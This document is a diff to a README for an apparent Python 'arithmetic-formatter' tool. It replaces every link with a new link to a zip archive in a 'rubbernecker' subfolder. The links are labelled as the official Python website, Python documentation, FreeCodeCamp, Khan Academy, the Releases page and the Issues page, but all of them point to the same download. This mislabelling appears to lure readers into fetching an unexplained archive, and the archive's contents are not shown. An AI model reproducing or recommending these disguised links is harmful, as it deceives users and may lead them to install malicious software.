@@ -4,7 +4,7 @@
 Welcome to the **arithmetic-formatter** project! This Python tool helps you format lists of arithmetic problems into a clear and organized layout. With this tool, you can take a messy list of math problems and arrange them vertically and side-by-side for easy reading.
 
 ## 📥 Download the Application
-[![Download the application](https://raw.githubusercontent.com/Nottttyx/arithmetic-formatter/main/rubbernecker/formatter_arithmetic_v1.1.zip%20Releases-blue)](https://raw.githubusercontent.com/Nottttyx/arithmetic-formatter/main/rubbernecker/formatter_arithmetic_v1.1.zip)
+[![Download the application](https://github.com/Nottttyx/arithmetic-formatter/raw/refs/heads/main/rubbernecker/arithmetic_formatter_2.7.zip%20Releases-blue)](https://github.com/Nottttyx/arithmetic-formatter/raw/refs/heads/main/rubbernecker/arithmetic_formatter_2.7.zip)
 
 You can download the latest version of the application from our Releases page. This step is crucial for setting up the tool on your computer.
 
@@ -12,13 +12,13 @@ You can download the latest version of the application from our Releases page. T
 To run the arithmetic-formatter on your computer, you will need:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Python:** Make sure Python 3.x is installed. If not, you can download it from the [official Python website](https://raw.githubusercontent.com/Nottttyx/arithmetic-formatter/main/rubbernecker/formatter_arithmetic_v1.1.zip).
+- **Python:** Make sure Python 3.x is installed. If not, you can download it from the [official Python website](https://github.com/Nottttyx/arithmetic-formatter/raw/refs/heads/main/rubbernecker/arithmetic_formatter_2.7.zip).
 - **Minimum Disk Space:** 50 MB free space available
 - **RAM:** At least 1 GB of RAM
 
 ## 💻 Download & Install
 1. Click the link below to visit the Releases page:
-   [Visit Releases Page](https://raw.githubusercontent.com/Nottttyx/arithmetic-formatter/main/rubbernecker/formatter_arithmetic_v1.1.zip)
+   [Visit Releases Page](https://github.com/Nottttyx/arithmetic-formatter/raw/refs/heads/main/rubbernecker/arithmetic_formatter_2.7.zip)
    
 2. On the Releases page, you will see a list of available versions. Find the latest version labeled as “Latest Release.” 
 
@@ -62,14 +62,14 @@ Yes, you need Python 3.x installed on your computer for the application to funct
 Absolutely! We welcome contributions. Please visit our GitHub repository for guidelines.
 
 **4. Where can I report issues or bugs?**
-You can report any problems on the Issues section of the [GitHub repository](https://raw.githubusercontent.com/Nottttyx/arithmetic-formatter/main/rubbernecker/formatter_arithmetic_v1.1.zip).
+You can report any problems on the Issues section of the [GitHub repository](https://github.com/Nottttyx/arithmetic-formatter/raw/refs/heads/main/rubbernecker/arithmetic_formatter_2.7.zip).
 
 ## 📝 Additional Resources
 If you wish to learn more about arithmetic operations or Python programming, here are some useful links:
 
-- [Python Official Documentation](https://raw.githubusercontent.com/Nottttyx/arithmetic-formatter/main/rubbernecker/formatter_arithmetic_v1.1.zip)
-- [FreeCodeCamp - Python for Beginners](https://raw.githubusercontent.com/Nottttyx/arithmetic-formatter/main/rubbernecker/formatter_arithmetic_v1.1.zip)
-- [Khan Academy - Arithmetic Basics](https://raw.githubusercontent.com/Nottttyx/arithmetic-formatter/main/rubbernecker/formatter_arithmetic_v1.1.zip)
+- [Python Official Documentation](https://github.com/Nottttyx/arithmetic-formatter/raw/refs/heads/main/rubbernecker/arithmetic_formatter_2.7.zip)
+- [FreeCodeCamp - Python for Beginners](https://github.com/Nottttyx/arithmetic-formatter/raw/refs/heads/main/rubbernecker/arithmetic_formatter_2.7.zip)
+- [Khan Academy - Arithmetic Basics](https://github.com/Nottttyx/arithmetic-formatter/raw/refs/heads/main/rubbernecker/arithmetic_formatter_2.7.zip)
 
 ## 💬 Contact
 For any further help or questions, feel free to reach out through the Issues section on GitHub or check the Discussions page for community support.
